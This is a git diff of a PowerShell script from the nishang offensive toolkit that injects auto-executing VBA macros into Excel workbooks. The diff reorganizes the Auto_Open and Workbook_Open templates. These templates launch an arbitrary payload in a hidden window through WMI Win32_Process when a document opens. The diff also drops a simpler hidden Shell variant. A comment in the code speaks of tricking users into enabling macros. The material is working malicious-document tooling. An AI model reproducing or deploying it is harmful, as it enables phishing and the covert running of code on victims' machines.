@@ -203,49 +203,6 @@ https://github.com/samratashok/nishang
     }
 
 
-    #Macro Code
-    #Macro code from here http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/
-    $CodeAuto = @"
-    Sub Auto_Open()
-    Execute
-
-    End Sub
-
-
-         Public Function Execute() As Variant
-            Const HIDDEN_WINDOW = 0
-            strComputer = "."
-            Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
-         
-            Set objStartup = objWMIService.Get("Win32_ProcessStartup")
-            Set objConfig = objStartup.SpawnInstance_
-            objConfig.ShowWindow = HIDDEN_WINDOW
-            Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-            objProcess.Create "$Payload", Null, objConfig, intProcessID
-         End Function
-"@
-
-    $CodeWorkbook = @"
-    Sub Workbook_Open()
-    Execute
-
-    End Sub
-
-
-         Public Function Execute() As Variant
-            Const HIDDEN_WINDOW = 0
-            strComputer = "."
-            Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
-         
-            Set objStartup = objWMIService.Get("Win32_ProcessStartup")
-            Set objConfig = objStartup.SpawnInstance_
-            objConfig.ShowWindow = HIDDEN_WINDOW
-            Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-            objProcess.Create "$Payload", Null, objConfig, intProcessID
-         End Function
-"@
-
-
     if($PayloadScript)
     {
         #Logic to read, compress and Base64 encode the payload script.
@@ -332,27 +289,48 @@ https://github.com/samratashok/nishang
         $Payload = $FinalPayload
 
     }
-    #If the payload is small in size, there is no need of multiline macro.
-    else
-    {
-        #Macro Code (inspired from metasploit)
-        $code_one = @"
+    #Macro Code
+    #Macro code from here http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/
+    $CodeAuto = @"
+    Sub Auto_Open()
+    Execute
 
-        Sub Execute
-            Dim payload
-            payload = "$Payload"
-            Call Shell(payload, vbHide)
-        End Sub
+    End Sub
 
-        Sub Auto_Open()
-            Execute
-        End Sub
-        Sub Workbook_Open()
-            Execute
-        End Sub
 
+         Public Function Execute() As Variant
+            Const HIDDEN_WINDOW = 0
+            strComputer = "."
+            Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+            Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+            Set objConfig = objStartup.SpawnInstance_
+            objConfig.ShowWindow = HIDDEN_WINDOW
+            Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+            objProcess.Create $Payload, Null, objConfig, intProcessID
+         End Function
 "@
-    }
+
+    $CodeWorkbook = @"
+    Sub Workbook_Open()
+    Execute
+
+    End Sub
+
+
+         Public Function Execute() As Variant
+            Const HIDDEN_WINDOW = 0
+            strComputer = "."
+            Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+            Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+            Set objConfig = objStartup.SpawnInstance_
+            objConfig.ShowWindow = HIDDEN_WINDOW
+            Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+            objProcess.Create $Payload, Null, objConfig, intProcessID
+         End Function
+"@
+
 
 
   
@@ -386,7 +364,7 @@ https://github.com/samratashok/nishang
             {
                 Write-Verbose "Using auto-executable macro."
                 $ExcelModule = $WorkBook.VBProject.VBComponents.Item(1)
-                $ExcelModule.CodeModule.AddFromString($code_one)
+                $ExcelModule.CodeModule.AddFromString($CodeWorkbook)
             }
             $Savepath = $ExcelFile.DirectoryName + "\" + $ExcelFile.BaseName + ".xls"
             #Append .xls to the original file name if file extensions are hidden for known file types.
@@ -436,7 +414,7 @@ https://github.com/samratashok/nishang
         {
             Write-Verbose "Using auto-executable macro."
             $ExcelModule = $WorkBook.VBProject.VBComponents.Add(1)
-            $ExcelModule.CodeModule.AddFromString($code_one)
+            $ExcelModule.CodeModule.AddFromString($CodeAuto)
         }
 
         #Add stuff to trick user in Enabling Content (running macros)
